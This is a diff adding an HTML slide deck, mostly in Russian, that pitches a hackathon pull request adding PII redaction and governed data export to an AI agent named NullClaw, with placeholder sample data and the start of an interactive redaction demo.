@@ -1,0 +1,1683 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NullClaw Data Governance Layer · PR #885</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5/dist/reveal.css">
+  <style>
+    :root {
+      color-scheme: light;
+      --black: #17131c;
+      --ink: #12051e;
+      --muted: #6d6578;
+      --muted-2: #9a90a5;
+      --paper: #f7f5fa;
+      --white: #ffffff;
+      --line: #ded6e8;
+      --line-soft: #eee8f4;
+      --purple: #7f30e3;
+      --pink: #f90479;
+      --orange: #fe5f00;
+      --lavender: #e5a6e7;
+      --green: #94e330;
+      --purple-soft: #f4edff;
+      --pink-soft: #fff0f7;
+      --orange-soft: #fff1e6;
+      --green-soft: #f0fbdf;
+      --shadow: 0 4px 14px rgba(32, 10, 54, 0.08), 0 18px 42px rgba(32, 10, 54, 0.08);
+      --soft-shadow: 0 1px 3px rgba(32, 10, 54, 0.06), 0 8px 22px rgba(32, 10, 54, 0.05);
+      --radius: 9px;
+      --control: 6px;
+      --font-head: "Unbounded", "Inter", sans-serif;
+      --font-body: "Inter", -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+      --font-mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      --camera: 194px;
+      --deck-scale: 1;
+      --camera-offset-x: 26px;
+      --camera-offset-y: 54px;
+      --stage-width: 1280px;
+      --stage-height: 720px;
+      --stage-scale: 1;
+      --stage-x: 0px;
+      --stage-y: 0px;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-width: 1120px;
+      min-height: 100vh;
+      overflow: hidden;
+      color: var(--black);
+      background:
+        linear-gradient(180deg, #ffffff 0, #fbf9fd 360px, var(--paper) 100%);
+      font-family: var(--font-body);
+      text-rendering: optimizeLegibility;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    button,
+    textarea,
+    input {
+      font: inherit;
+    }
+
+    button {
+      cursor: pointer;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .button,
+    .mini-button,
+    .chip {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      min-height: 34px;
+      border: 1px solid var(--line);
+      border-radius: var(--control);
+      background: var(--white);
+      color: var(--ink);
+      padding: 0 12px;
+      font-size: 12px;
+      font-weight: 800;
+      transition: transform 140ms ease, background 140ms ease, border-color 140ms ease;
+    }
+
+    .button.primary {
+      border-color: var(--black);
+      background: var(--black);
+      color: var(--white);
+    }
+
+    .button:hover,
+    .mini-button:hover {
+      transform: translateY(-1px);
+      background: #fbf8ff;
+    }
+
+    .button.primary:hover {
+      background: #2a1d35;
+    }
+
+    .mini-button {
+      min-width: 34px;
+      padding: 0 10px;
+    }
+
+    .progress-rail {
+      position: fixed;
+      left: 24px;
+      right: 24px;
+      bottom: 18px;
+      z-index: 35;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      pointer-events: none;
+    }
+
+    .progress-rail span {
+      height: 5px;
+      flex: 1;
+      border-radius: 999px;
+      background: #e7e1ee;
+      transition: background 160ms ease, transform 160ms ease;
+    }
+
+    .progress-rail span.active {
+      background: var(--purple);
+      transform: scaleY(1.8);
+    }
+
+    .camera-slot {
+      position: fixed;
+      right: var(--camera-offset-x);
+      bottom: var(--camera-offset-y);
+      z-index: 50;
+      width: var(--camera);
+      height: var(--camera);
+      border: 2px solid var(--black);
+      border-radius: 50%;
+      background:
+        radial-gradient(circle at 50% 45%, rgba(255,255,255,0.95), rgba(247,245,250,0.84) 62%, rgba(23,19,28,0.1));
+      box-shadow: 0 0 0 8px rgba(127, 48, 227, 0.08), var(--shadow);
+      pointer-events: none;
+      transform: scale(var(--deck-scale));
+      transform-origin: right bottom;
+    }
+
+    .camera-slot::before {
+      content: "";
+      position: absolute;
+      inset: 14px;
+      border: 1px dashed rgba(127, 48, 227, 0.55);
+      border-radius: 50%;
+    }
+
+    .camera-slot::after {
+      content: "CAM";
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      color: rgba(23, 19, 28, 0.48);
+      font-size: 18px;
+      font-weight: 900;
+      letter-spacing: 0.1em;
+    }
+
+    body.camera-off .camera-slot {
+      display: none;
+    }
+
+    .reveal {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100vh;
+      overflow: hidden;
+      color: var(--black);
+      background: transparent;
+    }
+
+    .reveal .slides {
+      position: fixed !important;
+      left: 0 !important;
+      top: 0 !important;
+      width: var(--stage-width) !important;
+      height: var(--stage-height) !important;
+      max-width: none !important;
+      max-height: none !important;
+      margin: 0 !important;
+      text-align: left;
+      transform: translate(var(--stage-x), var(--stage-y)) scale(var(--stage-scale)) !important;
+      transform-origin: 0 0 !important;
+    }
+
+    .reveal .slides section {
+      width: 100% !important;
+      height: 100% !important;
+      min-height: 0;
+      padding: 28px 210px 46px 48px;
+    }
+
+    .reveal h1,
+    .reveal h2,
+    .reveal h3,
+    .reveal p,
+    .reveal li,
+    .reveal button,
+    .reveal textarea {
+      font-family: inherit;
+      letter-spacing: 0;
+    }
+
+    .reveal h1,
+    .reveal h2 {
+      margin: 0;
+      color: var(--ink);
+      font-family: var(--font-head);
+      font-weight: 700;
+      line-height: 1.05;
+    }
+
+    .reveal h1 {
+      max-width: 1050px;
+      font-size: 42px;
+    }
+
+    .reveal h2 {
+      font-size: 29px;
+    }
+
+    .reveal h3 {
+      margin: 0;
+      color: var(--ink);
+      font-size: 17px;
+      font-weight: 800;
+      line-height: 1.22;
+    }
+
+    .reveal p,
+    .reveal li {
+      max-width: 780px;
+      color: var(--muted);
+      font-size: 14px;
+      line-height: 1.42;
+    }
+
+    .reveal strong {
+      color: var(--ink);
+      font-weight: 800;
+    }
+
+    .code-token {
+      display: inline-block;
+      vertical-align: baseline;
+      min-height: 1.55em;
+      border: 1px solid #d8d1e1;
+      border-radius: 5px;
+      background: #f0edf4;
+      color: #403747;
+      padding: 0 0.4em;
+      font-family: var(--font-mono);
+      font-size: 0.86em;
+      font-weight: 650;
+      line-height: 1.25;
+      white-space: nowrap;
+    }
+
+    .card .code-token {
+      max-width: 100%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      vertical-align: -0.12em;
+    }
+
+    .cards-4 .card .code-token {
+      display: inline;
+      border: 0;
+      background: transparent;
+      padding: 0;
+      font-family: inherit;
+      font-size: inherit;
+      font-weight: 700;
+      white-space: normal;
+    }
+
+    .reveal .controls,
+    .reveal .slide-number,
+    .reveal .progress {
+      display: none !important;
+    }
+
+    .slide-grid {
+      display: grid;
+      gap: 12px;
+    }
+
+    .hero {
+      display: grid;
+      gap: 16px;
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--purple);
+      font-size: 12px;
+      line-height: 1;
+      font-weight: 900;
+      text-transform: uppercase;
+    }
+
+    .eyebrow::before {
+      content: "";
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--green);
+    }
+
+    .lead {
+      margin: 0;
+      max-width: 880px;
+      color: #403747;
+      font-size: 18px;
+      line-height: 1.32;
+    }
+
+    .card,
+    .score-card,
+    .panel,
+    .story-card,
+    .person,
+    .lab {
+      border: 1px solid var(--line-soft);
+      border-radius: var(--radius);
+      background: var(--white);
+      box-shadow: var(--soft-shadow);
+    }
+
+    .card,
+    .score-card,
+    .panel,
+    .story-card,
+    .person {
+      padding: 14px;
+    }
+
+    .cards-3 {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 10px;
+    }
+
+    .cards-4 {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 10px;
+    }
+
+    .split {
+      display: grid;
+      grid-template-columns: minmax(0, 1.08fr) minmax(360px, 0.92fr);
+      gap: 12px;
+      align-items: stretch;
+    }
+
+    .card {
+      position: relative;
+      min-height: 104px;
+      overflow: hidden;
+    }
+
+    .card::before {
+      content: "";
+      position: absolute;
+      inset: 0 auto 0 0;
+      width: 3px;
+      background: var(--purple);
+      opacity: 0;
+      transition: opacity 160ms ease;
+    }
+
+    .card:hover::before,
+    .card.active::before {
+      opacity: 1;
+    }
+
+    .card b,
+    .score-card b {
+      display: block;
+      color: var(--ink);
+      font-size: 19px;
+      font-weight: 850;
+      line-height: 1.05;
+      margin-bottom: 8px;
+    }
+
+    .card span,
+    .score-card span,
+    .person span {
+      display: block;
+      color: var(--muted);
+      font-size: 12px;
+      line-height: 1.35;
+    }
+
+    .chip {
+      min-height: 0;
+      height: 26px;
+      border-radius: 999px;
+      font-size: 11px;
+      line-height: 1;
+      padding: 0 10px;
+      white-space: nowrap;
+    }
+
+    .chip.purple { border-color: #e1d1f8; background: var(--purple-soft); color: var(--purple); }
+    .chip.green { border-color: #d4efaa; background: var(--green-soft); color: #3a5c00; }
+    .chip.orange { border-color: #ffd5b8; background: var(--orange-soft); color: #8a3500; }
+    .chip.pink { border-color: #ffc8df; background: var(--pink-soft); color: var(--pink); }
+    .chip.black { border-color: var(--black); background: var(--black); color: var(--white); }
+
+    .poster {
+      position: relative;
+      min-height: 236px;
+      border: 1px solid var(--line-soft);
+      border-radius: var(--radius);
+      background:
+        linear-gradient(135deg, rgba(127,48,227,0.08), transparent 42%),
+        linear-gradient(180deg, #ffffff, #fbf8ff);
+      box-shadow: var(--shadow);
+      padding: 18px;
+      overflow: hidden;
+    }
+
+    .poster::after {
+      content: "DG";
+      position: absolute;
+      right: -18px;
+      bottom: -36px;
+      color: rgba(127,48,227,0.08);
+      font-family: var(--font-head);
+      font-size: 128px;
+      font-weight: 800;
+      line-height: 1;
+    }
+
+    .terminal {
+      min-height: 128px;
+      margin-top: 14px;
+      overflow: hidden;
+      border: 1px solid #2a1d35;
+      border-radius: var(--radius);
+      background: var(--black);
+      color: #f7f5fa;
+      padding: 12px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      line-height: 1.45;
+      white-space: pre-wrap;
+    }
+
+    .safe { color: var(--green); font-weight: 850; }
+    .warn { color: #ffb064; font-weight: 850; }
+    .bad { color: #ff78ad; font-weight: 850; }
+
+    .score-shell {
+      display: grid;
+      grid-template-columns: 270px minmax(0, 1fr);
+      gap: 10px;
+      width: 100%;
+      min-width: 0;
+    }
+
+    .score-tabs {
+      display: grid;
+      gap: 6px;
+      width: 270px;
+      min-width: 270px;
+      max-width: 270px;
+      grid-auto-rows: 40px;
+      align-content: start;
+    }
+
+    .score-tab {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) auto;
+      align-items: center;
+      gap: 10px;
+      height: 40px;
+      min-height: 0;
+      max-height: 40px;
+      width: 270px;
+      border: 1px solid var(--line);
+      border-radius: var(--control);
+      background: var(--white);
+      color: var(--black);
+      padding: 0 12px;
+      text-align: left;
+      font-size: 11px;
+      font-weight: 850;
+      overflow: hidden;
+      white-space: nowrap;
+    }
+
+    .score-tab.active {
+      border-color: #d9c5f5;
+      background: var(--purple-soft);
+      color: var(--purple);
+    }
+
+    .score-tab em {
+      color: var(--muted-2);
+      font-style: normal;
+      font-size: 11px;
+      justify-self: end;
+    }
+
+    .score-tab > span {
+      overflow: hidden;
+      min-width: 0;
+      text-overflow: ellipsis;
+    }
+
+    .score-card {
+      min-height: 306px;
+      padding: 16px;
+      min-width: 0;
+      overflow: hidden;
+    }
+
+    .score-card > .chip {
+      width: max-content;
+      max-width: 100%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 18px;
+    }
+
+    .score-card h2,
+    .score-card p {
+      max-width: 100%;
+      min-width: 0;
+      overflow-wrap: break-word;
+    }
+
+    .score-card > .chip > span {
+      display: block;
+      transform: translateY(-0.5px);
+    }
+
+    .score-meter {
+      display: grid;
+      grid-template-columns: 1fr 74px;
+      gap: 12px;
+      align-items: center;
+      margin: 10px 0;
+    }
+
+    .score-meter i {
+      overflow: hidden;
+      height: 11px;
+      border-radius: 999px;
+      background: #e7e1ee;
+    }
+
+    .score-meter i span {
+      display: block;
+      height: 100%;
+      border-radius: 999px;
+      background: var(--purple);
+      transition: width 280ms ease;
+    }
+
+    .score-meter strong {
+      color: var(--ink);
+      font-size: 24px;
+      font-weight: 900;
+      text-align: right;
+    }
+
+    .boundary-board {
+      display: grid;
+      grid-template-columns: repeat(7, minmax(0, 1fr));
+      gap: 8px;
+      margin-top: 8px;
+    }
+
+    .boundary {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      min-height: 106px;
+      border: 1px solid var(--line-soft);
+      border-radius: var(--radius);
+      background: var(--white);
+      padding: 11px;
+      text-align: left;
+      transition: background 140ms ease, transform 140ms ease, border-color 140ms ease;
+    }
+
+    .boundary:hover,
+    .boundary.active {
+      transform: translateY(-2px);
+      border-color: #d9c5f5;
+      background: var(--purple-soft);
+    }
+
+    .boundary b {
+      display: block;
+      margin-bottom: 6px;
+      color: var(--ink);
+      font-size: 12px;
+      font-weight: 850;
+      line-height: 1.15;
+    }
+
+    .boundary span {
+      color: var(--muted);
+      font-size: 10px;
+      line-height: 1.35;
+    }
+
+    .boundary small {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      min-height: 22px;
+      margin-top: auto;
+      border: 1px solid #d4efaa;
+      border-radius: 999px;
+      background: var(--green-soft);
+      color: #355700;
+      padding: 0 8px;
+      font-size: 9px;
+      font-weight: 900;
+      line-height: 1;
+      text-transform: uppercase;
+    }
+
+    .boundary small::before {
+      content: "";
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--green);
+      box-shadow: 0 0 0 2px rgba(148, 227, 48, 0.18);
+    }
+
+    .inspector {
+      display: grid;
+      grid-template-columns: minmax(0, 0.85fr) minmax(0, 1.15fr);
+      gap: 10px;
+      align-items: stretch;
+      margin-top: 10px;
+    }
+
+    .inspector .panel {
+      min-height: 190px;
+    }
+
+    .lab {
+      display: grid;
+      grid-template-columns: minmax(0, 0.88fr) minmax(0, 1.12fr);
+      gap: 0;
+      overflow: hidden;
+    }
+
+    .lab-side {
+      padding: 14px;
+      border-right: 1px solid var(--line-soft);
+      background: var(--white);
+    }
+
+    .lab-main {
+      padding: 14px;
+      background: #fffafd;
+    }
+
+    textarea {
+      width: 100%;
+      height: 148px;
+      resize: none;
+      border: 1px solid var(--line);
+      border-radius: var(--control);
+      outline: 0;
+      background: var(--paper);
+      color: var(--black);
+      padding: 12px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      line-height: 1.45;
+    }
+
+    textarea:focus {
+      border-color: #c3a4ef;
+      box-shadow: 0 0 0 3px rgba(127, 48, 227, 0.1);
+    }
+
+    .toggle-row,
+    .tabs,
+    .sample-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 8px;
+    }
+
+    .toggle {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      min-height: 28px;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      background: var(--white);
+      color: var(--black);
+      padding: 0 10px;
+      font-size: 10px;
+      font-weight: 800;
+    }
+
+    .toggle input {
+      accent-color: var(--purple);
+    }
+
+    .tab {
+      min-height: 28px;
+      border: 1px solid var(--line);
+      border-radius: 999px;
+      background: var(--white);
+      color: #50465b;
+      padding: 0 11px;
+      font-size: 10px;
+      font-weight: 850;
+    }
+
+    .tab.active {
+      border-color: #d9c5f5;
+      background: var(--purple-soft);
+      color: var(--purple);
+    }
+
+    .output {
+      display: none;
+    }
+
+    .output.active {
+      display: block;
+    }
+
+    .lab-main .tabs {
+      margin-bottom: 12px;
+    }
+
+    .story-flow {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      gap: 10px;
+    }
+
+    .story-card {
+      position: relative;
+      min-height: 136px;
+      padding: 14px;
+      overflow: hidden;
+    }
+
+    .story-card::after {
+      content: attr(data-step);
+      position: absolute;
+      right: 14px;
+      top: 12px;
+      color: rgba(127, 48, 227, 0.13);
+      font-family: var(--font-head);
+      font-size: 30px;
+      font-weight: 800;
+      line-height: 1;
+    }
+
+    .story-card p {
+      margin-bottom: 0;
+      font-size: 12px;
+    }
+
+    .people {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      gap: 14px;
+    }
+
+    .person {
+      min-height: 222px;
+    }
+
+    .avatar {
+      display: grid;
+      width: 42px;
+      height: 42px;
+      place-items: center;
+      border-radius: 999px;
+      background: var(--black);
+      color: var(--white);
+      font-weight: 900;
+      margin-bottom: 8px;
+    }
+
+    .person:nth-child(2) .avatar { background: var(--purple); }
+    .person:nth-child(3) .avatar { background: var(--orange); }
+
+    .tasks {
+      display: grid;
+      gap: 6px;
+      margin-top: 10px;
+    }
+
+    .tasks span {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      color: var(--muted);
+      font-size: 11px;
+      line-height: 1.35;
+    }
+
+    .tasks i {
+      display: grid;
+      width: 17px;
+      height: 17px;
+      flex: 0 0 auto;
+      place-items: center;
+      border-radius: 50%;
+      background: var(--green-soft);
+      color: #3a5c00;
+      font-style: normal;
+      font-size: 11px;
+      font-weight: 900;
+    }
+
+    .final {
+      display: grid;
+      min-height: 440px;
+      place-items: center;
+      text-align: center;
+    }
+
+    .final > div {
+      transform: translateY(18px);
+    }
+
+    .final h1,
+    .final p {
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .final-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-top: 16px;
+    }
+
+    section[data-title="NullClaw Data Governance Layer"] .poster {
+      min-height: 292px;
+    }
+
+    section[data-title="NullClaw Data Governance Layer"] .poster .terminal {
+      min-height: 184px;
+    }
+
+    section[data-title="Problem map"] .slide-grid,
+    section[data-title="Live redaction demo"] .slide-grid,
+    section[data-title="Judging criteria"] .slide-grid,
+    section[data-title="Team execution"] .slide-grid {
+      gap: 16px;
+    }
+
+    section[data-title="Problem map"] .boundary {
+      min-height: 112px;
+      padding: 13px;
+    }
+
+    section[data-title="Problem map"] .boundary b {
+      font-size: 13px;
+      margin-bottom: 8px;
+    }
+
+    section[data-title="Problem map"] .boundary span {
+      font-size: 11px;
+    }
+
+    section[data-title="Problem map"] .inspector .panel,
+    section[data-title="Problem map"] .inspector .terminal {
+      min-height: 326px;
+    }
+
+    section[data-title="Problem map"] .inspector .panel {
+      display: flex;
+      flex-direction: column;
+    }
+
+    section[data-title="Problem map"] #nextBoundary {
+      align-self: flex-start;
+      margin-top: auto;
+    }
+
+    section[data-title="Live redaction demo"] .lab-side,
+    section[data-title="Live redaction demo"] .lab-main {
+      padding: 18px;
+    }
+
+    section[data-title="Live redaction demo"] textarea {
+      height: 220px;
+    }
+
+    section[data-title="Live redaction demo"] .terminal {
+      min-height: 370px;
+    }
+
+    section[data-title="Judging criteria"] .score-card {
+      display: flex;
+      height: 406px;
+      min-height: 0;
+      flex-direction: column;
+      padding: 22px;
+    }
+
+    section[data-title="Judging criteria"] .score-shell,
+    section[data-title="Judging criteria"] .score-tabs {
+      height: 406px;
+      min-height: 406px;
+      max-height: 406px;
+    }
+
+    section[data-title="Judging criteria"] .score-tab {
+      height: 42px;
+      min-height: 42px;
+      max-height: 42px;
+      font-size: 12px;
+    }
+
+    section[data-title="Judging criteria"] .score-tabs {
+      grid-auto-rows: 42px;
+    }
+
+    section[data-title="Judging criteria"] .terminal {
+      min-height: 0;
+      flex: 1;
+    }
+
+    section[data-title="Judging criteria"] #scoreTitle {
+      font-size: 26px;
+      line-height: 1.08;
+    }
+
+    section[data-title="Judging criteria"] #scoreText {
+      min-height: 42px;
+    }
+
+    section[data-title="Team execution"] .person {
+      min-height: 320px;
+      padding: 18px;
+    }
+
+    section[data-title="Team execution"] .avatar {
+      width: 52px;
+      height: 52px;
+      margin-bottom: 12px;
+    }
+
+    section[data-title="Team execution"] .card {
+      min-height: 128px;
+      padding: 16px;
+    }
+
+    section[data-title="Closing"] .final {
+      min-height: 620px;
+    }
+
+    section[data-title="Technical challenge"] .panel h2 {
+      font-size: 27px;
+      line-height: 1.08;
+    }
+
+    section[data-title="Technical challenge"] .panel .terminal {
+      margin-top: 18px;
+    }
+
+    @media (max-width: 980px) {
+      body {
+        min-width: 0;
+        overflow: auto;
+      }
+
+      :root { --camera: 146px; }
+
+      .reveal .slides section {
+        padding: 32px 18px 150px;
+      }
+
+      .cards-3,
+      .cards-4,
+      .split,
+      .score-shell,
+      .boundary-board,
+      .inspector,
+      .lab,
+      .story-flow,
+      .people {
+        grid-template-columns: 1fr;
+      }
+
+      .lab-side {
+        border-right: 0;
+        border-bottom: 1px solid var(--line-soft);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="camera-slot" aria-hidden="true"></div>
+  <div class="progress-rail" id="progressRail" aria-hidden="true"></div>
+
+  <div class="reveal">
+    <div class="slides">
+      <section data-title="NullClaw Data Governance Layer">
+        <div class="hero">
+          <div class="eyebrow">Хакатон · pitch</div>
+          <h1>Мы добавили слой доверия для AI-агента, который работает с данными</h1>
+          <p class="lead">
+            NullClaw Data Governance Layer защищает путь данных через LLM, embeddings, память,
+            логи, экспорт и DS-аналитику. Это PR про практическую приватность, а не про косметику
+          </p>
+          <div class="cards-4">
+            <div class="card active">
+              <b>Полезность</b>
+              <span>Память агента становится безопасным DS artifact, а не источником случайных утечек</span>
+            </div>
+            <div class="card">
+              <b>Глубина</b>
+              <span>Закрыты неочевидные boundaries: tool calls, embeddings, diagnostics, persistence</span>
+            </div>
+            <div class="card">
+              <b>Minimalism</b>
+              <span>Zig/std, без тяжёлой DLP или ML зависимости, совместимо с философией nullclaw</span>
+            </div>
+            <div class="card">
+              <b>Готовность</b>
+              <span>Tests, docs, ReleaseSmall, CI на Linux, macOS и Windows</span>
+            </div>
+          </div>
+          <div class="poster">
+            <div class="split">
+              <div>
+                <span class="chip purple">Team: Безопасность бэкофиса (DS)</span>
+                <h2 style="margin-top:16px">Агент может быть полезным с данными, не становясь каналом утечки</h2>
+                <p>Ключевой вклад: privacy по умолчанию и явное пользовательское намерение для raw-data путей</p>
+              </div>
+              <div class="terminal">user: alice@example.com
+card: 4242 4242 4242 4242
+token: sk-live-secret
+
+provider / export / logs see:
+<span class="safe">[EMAIL_1]</span>, <span class="safe">[CARD_1]</span>, <span class="safe">[TOKEN_1]</span></div>
+            </div>
+          </div>
+        </div>
+        <aside class="notes">Открыть с тезиса: мы сделали слой доверия для данных, а не просто команду или утилиту</aside>
+      </section>
+
+      <section data-title="Why now">
+        <div class="slide-grid">
+          <div>
+            <div class="eyebrow">Why this matters now</div>
+            <h1>Privacy filtering уже становится стандартной частью AI pipelines</h1>
+            <p class="lead">
+              OpenAI выложили <span class="code-token">openai/privacy-filter</span> на Hugging Face. Это важный сигнал:
+              PII detection и masking становятся отдельным production primitive для AI-систем
+            </p>
+          </div>
+          <div class="split">
+            <div class="panel">
+              <span class="chip black">External signal</span>
+              <h2 style="margin-top:14px">OpenAI Privacy Filter</h2>
+              <p>
+                Модель для PII detection and masking в text workflows. В описании прямо говорится
+                про high-throughput data sanitization и on-premise сценарии
+              </p>
+              <a class="button primary" href="https://huggingface.co/openai/privacy-filter" target="_blank" rel="noreferrer">huggingface.co/openai/privacy-filter</a>
+            </div>
+            <div class="panel">
+              <span class="chip purple">Our adaptation</span>
+              <h2 style="margin-top:14px">nullclaw style</h2>
+              <p>
+                Мы решаем ту же продуктовую проблему, но в духе nullclaw: lightweight,
+                no-heavy-deps, explicit boundaries, safe defaults
+              </p>
+              <div class="terminal">No model dependency.
+No regex runtime dependency.
+No broad architecture rewrite.
+
+Zig primitive + agent boundaries</div>
+            </div>
+          </div>
+          <div class="story-flow">
+            <div class="story-card" data-step="1"><h3>LLM</h3><p>Provider calls больше не получают raw PII</p></div>
+            <div class="story-card" data-step="2"><h3>Memory</h3><p>Экспорт и autosave становятся governed surfaces</p></div>
+            <div class="story-card" data-step="3"><h3>Analytics</h3><p>SQLite tool даёт read-only DS workflow</p></div>
+            <div class="story-card" data-step="4"><h3>Review</h3><p>Security PR готов к внешнему review</p></div>
+          </div>
+        </div>
+        <aside class="notes">Сказать: мы не встраивали privacy-filter, но он подтверждает актуальность выбранного направления</aside>
+      </section>
+
+      <section data-title="Problem map">
+        <div class="slide-grid">
+          <div>
+            <div class="eyebrow">Реальная проблема</div>
+            <h1>PII утекает не только через prompt</h1>
+            <p class="lead">Кликните по surface. Справа видно, какой риск мы закрыли и как это выглядит после PR</p>
+          </div>
+          <div class="boundary-board">
+            <button class="boundary active" data-boundary="provider" type="button"><b>Provider</b><span>Chat, streaming, compaction</span><small>redacted</small></button>
+            <button class="boundary" data-boundary="embeddings" type="button"><b>Embeddings</b><span>Hybrid and shadow search</span><small>redacted</small></button>
+            <button class="boundary" data-boundary="tools" type="button"><b>Tools</b><span>Provider to tool args</span><small>default deny</small></button>
+            <button class="boundary" data-boundary="logs" type="button"><b>Logs</b><span>Verbose and observer details</span><small>safe preview</small></button>
+            <button class="boundary" data-boundary="export" type="button"><b>Export</b><span>Memory JSONL datasets</span><small>redacted</small></button>
+            <button class="boundary" data-boundary="sqlite" type="button"><b>SQLite</b><span>Read-only analytics result</span><small>safe</small></button>
+            <button class="boundary" data-boundary="image" type="button"><b>Image URL</b><span>Signed URL query secrets</span><small>stripped</small></button>
+          </div>
+          <div class="inspector">
+            <div class="panel">
+              <span class="chip purple" id="boundaryChip">Provider boundary</span>
+              <h2 id="boundaryTitle" style="margin-top:12px">Provider calls</h2>
+              <p id="boundaryText">Перед external LLM call provider-bound content заменяется на stable placeholders</p>
+              <button class="button primary" id="nextBoundary" type="button">Следующий риск</button>
+            </div>
+            <div class="terminal" id="boundaryTerminal">user: alice@example.com
+provider sees: <span class="safe">[EMAIL_1]</span>
+raw leaves process: <span class="safe">no</span></div>
+          </div>
+        </div>
+        <aside class="notes">Показать, что качество вклада в глубине boundary analysis, а не только в redactor function</aside>
+      </section>
+
+      <section data-title="What PR adds">
+        <div class="slide-grid">
+          <div>
+            <div class="eyebrow">Что изменили в PR #885</div>
+            <h1>Мы собрали privacy, DS export и safe analytics в один Data Governance Layer</h1>
+          </div>
+          <div class="story-flow">
+            <div class="story-card" data-step="DG1"><span class="chip purple">Core</span><h3>Reusable redactor</h3><p>Email, phone, card with Luhn, ID-like patterns, tokens and URL-like secrets</p></div>
+            <div class="story-card" data-step="DG2"><span class="chip green">LLM</span><h3>Provider redaction</h3><p>LLM, streaming, compaction, image URLs and embedding queries are protected</p></div>
+            <div class="story-card" data-step="DG3"><span class="chip orange">DS</span><h3>SQLite analytics</h3><p>Read-only SQL, allowlist, row and byte caps, PII-redacted output by default</p></div>
+            <div class="story-card" data-step="DG4"><span class="chip pink">Memory</span><h3>Governed export</h3><p>JSONL export is redacted by default, raw export requires explicit <span class="code-token">--include-pii</span></p></div>
+          </div>
+          <div class="split">
+            <div class="panel">
+              <h2>Архитектурная аккуратность</h2>
+              <p>Мы не переписали nullclaw вокруг новой идеи. Изменения встроены в существующие boundaries: agent, tools, memory, docs and tests</p>
+              <div class="terminal">fit: vtable/factory boundaries
+deps: no heavy dependencies
+defaults: secure by default
+scope: reviewable PR surface</div>
+            </div>
+            <div class="panel">
+              <h2>Практическая полезность</h2>
+              <p>DS-команда получает безопасный путь от memory к dataset и analytics. Разработчик получает меньше риска в agent runtime</p>
+              <div class="terminal">$ nullclaw memory export-jsonl
+{"content":"contact <span class="safe">[EMAIL_1]</span>"}
+
+raw only:
+  --include-pii</div>
+            </div>
+          </div>
+        </div>
+        <aside class="notes">Здесь перечислить, что было сделано, но держать акцент на ценности и fit под nullclaw</aside>
+      </section>
+
+      <section data-title="Live redaction demo">
+        <div class="slide-grid">
+          <div>
+            <div class="eyebrow">Интерактивное демо</div>
+            <h1>Redaction lab: безопасный output меняется прямо на слайде</h1>
+            <p class="lead">Поменяйте текст, переключите raw export или surface. Это маленькая демонстрация governance contract</p>
+          </div>
+          <div class="lab">
+            <div class="lab-side">
+              <h3>Input payload</h3>
+              <p>Данные, которые могли попасть в prompt, logs, export или SQL result</p>
+              <textarea id="redactionInput">Contact Alice at alice@example.com or +7 (999) 123-45-67.
+Card: 4242 4242 4242 4242.
+Image: https://s3.example/photo.png?X-Amz-Signature=deadbeef&access_token=abc/def+ghi%2B==
+Token: sk-live-secret-value</textarea>
+              <div class="toggle-row">
+                <label class="toggle">Provider safe <input type="checkbox" data-surface="provider" checked></label>
+                <label class="toggle">Logs safe <input type="checkbox" data-surface="logs" checked></label>
+                <label class="toggle">Raw export <input type="checkbox" id="includePii"></label>
+              </div>
+              <div class="sample-row">
+                <button class="tab" data-sample="default" type="button">Default</button>
+                <button class="tab" data-sample="sql" type="button">SQL</button>
+                <button class="tab" data-sample="url" type="button">Signed URL</button>
+              </div>
+            </div>
+            <div class="lab-main">
+              <div class="tabs">
+                <button class="tab active" data-output="provider" type="button">Provider</button>
+                <button class="tab" data-output="export" type="button">JSONL export</button>
+                <button class="tab" data-output="sqlite" type="button">SQLite</button>
+                <button class="tab" data-output="logs" type="button">Logs</button>
+              </div>
+              <div class="output active" data-output-card="provider"><div class="terminal" id="providerOut"></div></div>
+              <div class="output" data-output-card="export"><div class="terminal" id="exportOut"></div></div>
+              <div class="output" data-output-card="sqlite"><div class="terminal" id="sqliteOut"></div></div>
